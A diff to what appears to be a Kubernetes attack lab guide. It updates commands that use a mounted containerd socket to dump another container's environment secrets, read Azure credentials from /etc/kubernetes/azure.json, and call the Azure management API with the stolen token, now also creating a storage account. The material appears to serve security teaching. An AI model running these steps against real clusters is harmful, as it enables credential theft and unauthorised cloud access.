@@ -258,7 +258,7 @@ ctr --address /mnt/containerd.sock --namespace k8s.io container list
 We will now try to retrieve secrets from a container that we do not have access to (via Kubernetes):
 
 ```bash
-id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "87a94228f133e2da99cb16d653cd1373c5b4e8689956386c1c12b60a20421a02" | awk '{print $1}')
+id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "docker.io/library/nginx" | awk '{print $1}')
 
 ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
 ```
@@ -283,7 +283,7 @@ We will use the containerd CLI to access details of a container running on this 
 First we will retrieve the container ID:
 
 ```bash
-id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "87a94228f133e2da99cb16d653cd1373c5b4e8689956386c1c12b60a20421a02" | awk '{print $1}')
+id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "docker.io/library/nginx" | awk '{print $1}')
 ```
 
 And then request container runtime details such as environment variables:
@@ -336,9 +336,10 @@ SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
 RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)
 
 curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
-```
 
-We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.
+STAC=my0stac
+curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"sku":{"name":"Standard_LRS"},"kind":"StorageV2","location":"westeurope"}' https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG/providers/Microsoft.Storage/storageAccounts/my0stac?api-version=2018-02-01 | jq
+```
 
 <details>
 <summary>Details on how to retrieve a Cloud provider token</summary>
@@ -362,9 +363,12 @@ SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
 RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)
 
 curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
+
+STAC=my0stac
+curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"sku":{"name":"Standard_LRS"},"kind":"StorageV2","location":"westeurope"}' https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG/providers/Microsoft.Storage/storageAccounts/$STAC?api-version=2018-02-01 | jq
 ```
 
-We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.
+We could now use the secret to talk to the cloud provider management plane (in this case Azure Resource Manager) and try to create or access further resources. Furthermore we were able to create an Azure Storage Account.
 
 </details>
 
